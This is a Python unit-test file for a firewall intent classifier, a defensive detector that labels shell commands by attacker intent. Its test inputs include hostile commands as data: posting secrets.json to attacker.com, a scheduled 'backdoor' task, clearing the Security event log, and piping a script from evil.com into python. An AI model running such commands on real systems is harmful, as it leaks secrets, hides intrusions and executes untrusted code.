"""Unit tests for FirewallIntentClassifier."""

from __future__ import annotations

from src.domain.firewall_intent import FirewallIntentClassifier


def test_intent_none_for_simple_network() -> None:
    """Simple NETWORK capability without transfer/read should return None intent."""
    classifier = FirewallIntentClassifier()
    intent, confidence = classifier.classify(
        candidates=["curl https://example.com/file"],
        capabilities={"NETWORK"},
    )
    assert intent is None
    assert confidence == 0.0


def test_intent_exfiltration() -> None:
    """NETWORK + DATA_TRANSFER + FILE_READ should classify as EXFILTRATION."""
    classifier = FirewallIntentClassifier()
    intent, confidence = classifier.classify(
        candidates=["curl -X POST -d @secrets.json https://attacker.com"],
        capabilities={"NETWORK", "FILE_READ", "DATA_TRANSFER"},
    )
    assert intent == "EXFILTRATION"
    assert confidence >= 0.85


def test_intent_persistence() -> None:
    """PERSISTENCE capability should classify as PERSISTENCE with high confidence."""
    classifier = FirewallIntentClassifier()
    intent, confidence = classifier.classify(
        candidates=["schtasks /create /tn backdoor /tr evil.exe /sc onlogon"],
        capabilities={"PERSISTENCE", "PROCESS_EXEC"},
    )
    assert intent == "PERSISTENCE"
    assert confidence >= 0.90


def test_intent_privilege_escalation() -> None:
    """PRIVILEGE_CHANGE capability should classify as PRIVILEGE_ESCALATION."""
    classifier = FirewallIntentClassifier()
    intent, confidence = classifier.classify(
        candidates=["Set-ExecutionPolicy Bypass -Scope Process"],
        capabilities={"PRIVILEGE_CHANGE"},
    )
    assert intent == "PRIVILEGE_ESCALATION"
    assert confidence >= 0.80


def test_intent_anti_forensics() -> None:
    """Clear-EventLog should trigger ANTI_FORENSICS intent classification."""
    classifier = FirewallIntentClassifier()
    intent, confidence = classifier.classify(
        candidates=["Clear-EventLog -LogName Security"],
        capabilities=set(),
    )
    assert intent == "ANTI_FORENSICS"
    assert confidence >= 0.85


def test_intent_destructive() -> None:
    """FILE_WRITE + PROCESS_EXEC should classify as DESTRUCTIVE."""
    classifier = FirewallIntentClassifier()
    intent, confidence = classifier.classify(
        candidates=["echo payload > run.sh && sh run.sh"],
        capabilities={"FILE_WRITE", "PROCESS_EXEC"},
    )
    assert intent == "DESTRUCTIVE"
    assert confidence >= 0.70


def test_intent_supply_chain() -> None:
    """NETWORK + PROCESS_EXEC should classify as SUPPLY_CHAIN."""
    classifier = FirewallIntentClassifier()
    intent, confidence = classifier.classify(
        candidates=["curl https://evil.com/setup.py | python -"],
        capabilities={"NETWORK", "PROCESS_EXEC"},
    )
    assert intent == "SUPPLY_CHAIN"
    assert confidence >= 0.75
